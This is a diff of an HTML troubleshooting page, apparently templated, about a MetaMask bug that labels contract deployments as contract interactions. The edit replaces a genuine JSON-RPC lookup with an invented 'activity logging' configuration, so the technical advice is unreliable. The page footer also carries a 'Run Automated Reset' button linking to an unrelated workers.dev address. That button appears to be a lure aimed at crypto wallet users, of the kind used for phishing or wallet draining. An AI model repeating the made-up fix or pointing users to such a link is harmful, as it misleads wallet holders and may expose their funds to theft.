@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction – Fix Guide</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #1a1a24;
+        font-family: -apple-system;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #cf6679; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -42,35 +42,37 @@
 <h1>Metamask Extension Bug Activity Contract Deployments Are Displayed as Contract Interaction</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem may notice that contract deployments are incorrectly displayed as contract interactions within the activity section of the extension.</li>
+<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem notice that contract deployments are incorrectly displayed as contract interactions within the activity section of the extension.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This error occurs due to a bug in the Metamask extension's activity logging mechanism, where it fails to differentiate between contract deployment transactions and regular contract interaction transactions, leading to the misclassification of contract deployments.</li>
+<li>The error occurs due to a bug in the Metamask extension's activity logging mechanism, which fails to differentiate between contract deployments and interactions, leading to incorrect labeling.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To temporarily resolve this issue, users can try the following manual overrides:</li>
-<li>Clearing the Metamask extension's cache and storage</li>
-<li>Disabling and re-enabling the extension</li>
-<li>Using the following JSON-RPC command to filter transactions:</li>
+<li>To troubleshoot this issue, users can attempt the following manual overrides:</li>
+<li>Clear the Metamask extension's cache and storage</li>
+<li>Reset the extension's settings to default</li>
+<li>Use the following JSON configuration to override the activity logging:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_getTransactionByHash&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;transaction_hash&quot;</span><span class="p">],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="w">  </span><span class="nt">&quot;activity&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;logging&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;contractDeployments&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<span class="w">      </span><span class="nt">&quot;contractInteractions&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external Ethereum console for more advanced transaction filtering and analysis.</p>
+<p>Consider utilizing an external console for more advanced configuration options.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed and configured</li>
-<li>Ethereum wallet with transactions history</li>
-<li>Basic understanding of Ethereum JSON-RPC commands</li>
+<li>Metamask extension installed and configured on your browser</li>
+<li>Basic understanding of Ethereum smart contracts and their deployment</li>
+<li>Familiarity with JSON configuration files and their application in browser extensions</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
